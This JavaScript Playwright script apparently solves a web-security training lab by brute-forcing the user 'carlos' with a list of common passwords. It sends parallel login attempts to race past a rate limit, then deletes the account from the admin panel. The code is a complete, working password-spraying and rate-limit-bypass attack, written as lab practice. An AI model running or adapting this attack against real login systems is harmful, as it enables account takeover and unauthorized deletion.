const { getCsrf, runLab, textContent } = require('./_common.cjs');

const TITLE = 'Bypassing rate limits via race conditions';
const PATH = '/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits';
const PASSWORDS = [
  '123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
  'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty',
  '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890',
  'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000',
];
const GROUP_SIZE = 3;
const POST_WAIT_MS = 3000;
const RESET_WAIT_MS = 16000;

async function ensureFreshLab(page, labUrl) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  const body = await textContent(page);
  if (!/timer has run out|want to try again|restart lab/i.test(body)) return;

  const csrf = await getCsrf(page);
  await page.evaluate(async (csrf) => {
    const form = new URLSearchParams();
    if (csrf) form.set('csrf', csrf);
    await fetch('/restart', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: form.toString(),
    }).catch(() => {});
  }, csrf);

  await page.waitForTimeout(10000);
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
}

function chunk(values, size) {
  const groups = [];
  for (let i = 0; i < values.length; i += size) groups.push(values.slice(i, i + size));
  return groups;
}

async function isCarlosSession(page, labUrl) {
  await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  const body = await textContent(page);
  return /\/my-account/i.test(page.url()) || /admin panel/i.test(body);
}

async function deleteCarlosAsCurrentUser(page, labUrl) {
  await page.goto(labUrl + '/admin', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  const href = await page.evaluate(() => {
    return [...document.querySelectorAll('a[href]')].find((link) => {
      const target = `${link.getAttribute('href') || ''} ${link.textContent || ''}`;
      return /delete/i.test(target) && /carlos/i.test(target);
    })?.href || null;
  });
  if (!href) return false;
  await page.goto(href.startsWith('http') ? href : new URL(href, labUrl).toString(), { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  return true;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await ensureFreshLab(page, labUrl);
    const groups = chunk(PASSWORDS, GROUP_SIZE);

    for (let attempt = 1; attempt <= groups.length; attempt += 1) {
      const passwords = groups[attempt - 1];
      const workers = [];

      try {
        for (const password of passwords) {
          const context = await page.context().browser().newContext({ viewport: { width: 1280, height: 720 } });
          const workerPage = await context.newPage();
          await workerPage.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 30000 });
          await workerPage.fill('input[name="username"]', 'carlos');
          await workerPage.fill('input[name="password"]', password);
          workers.push({ context, page: workerPage, password });
        }

        await Promise.all(workers.map(async ({ page: workerPage }) => {
          await Promise.all([
            workerPage.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {}),
            workerPage.click('button[type="submit"], input[type="submit"], button:has-text("Log in")').catch(() => {}),
          ]);
        }));

        await Promise.all(workers.map(({ page: workerPage }) => workerPage.waitForTimeout(POST_WAIT_MS)));

        for (const worker of workers) {
          const ok = /\/my-account/i.test(worker.page.url()) || await isCarlosSession(worker.page, labUrl);
          console.log(`attempt ${attempt}: [${worker.password}] => ${ok ? 'authenticated' : 'miss'}`);
          if (!ok) continue;

          const deleted = await deleteCarlosAsCurrentUser(worker.page, labUrl);
          console.log(`attempt ${attempt}: admin-delete=${deleted ? 'triggered' : 'missing'}`);
          return;
        }
      } finally {
        await Promise.all(workers.map(({ context }) => context.close().catch(() => {})));
      }

      if (attempt < groups.length) {
        await page.waitForTimeout(RESET_WAIT_MS);
      }
    }

    throw new Error('No three-password window produced an authenticated Carlos session');
  },
});
